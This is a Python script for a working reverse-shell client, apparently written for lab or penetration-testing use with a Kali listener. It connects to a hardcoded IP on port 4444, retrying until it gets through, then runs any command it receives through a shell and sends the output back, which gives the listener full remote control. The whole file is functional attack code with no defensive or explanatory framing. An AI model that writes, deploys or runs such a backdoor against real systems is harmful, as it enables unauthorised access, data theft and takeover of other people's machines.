import socket
import json
import subprocess
import os
import base64
import time

def server_connect(ip, port):
    global connection
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            connection.connect((ip, port))
            break
        except ConnectionRefusedError:
            time.sleep(5)

def send(data):
    json_data = json.dumps(data)
    connection.send(json_data.encode('utf-8'))

def receive():
    json_data = ''
    while True:
        try:
            json_data += connection.recv(1024).decode('utf-8')
            return json.loads(json_data)
        except ValueError:
            continue

def client_run():
    while True:
        try:
            data = receive()
            command = data["cmd"]

            # Handle exit first
            if command.strip() == "exit":
                send({"output": "Closing connection"})
                connection.close()
                break

            # Handle cd
            elif command.strip() == "cd" or command.startswith("cd "):
                try:
                    path = command[2:].strip()

                    if path == "":
                        path = os.path.expanduser("~")

                    os.chdir(path)
                    send({"output": f"Changed directory to {os.getcwd()}"})

                except Exception as e:
                    send({"output": f"Error: {e}"})

            # Handle normal commands
            else:
                try:
                    result = subprocess.run(
                        command,
                        shell=True,
                        capture_output=True
                    )

                    output = result.stdout.decode("utf-8", errors="replace")
                    error = result.stderr.decode("utf-8", errors="replace")

                    if output:
                        send({"output": output})
                    else:
                        send({"output": error})

                except Exception as e:
                    send({"output": f"Error: {e}"})

        except Exception:
            break

server_connect('10.41.70.147', 4444) #Replace 10.0.2.15 with your Kali IP

client_run()
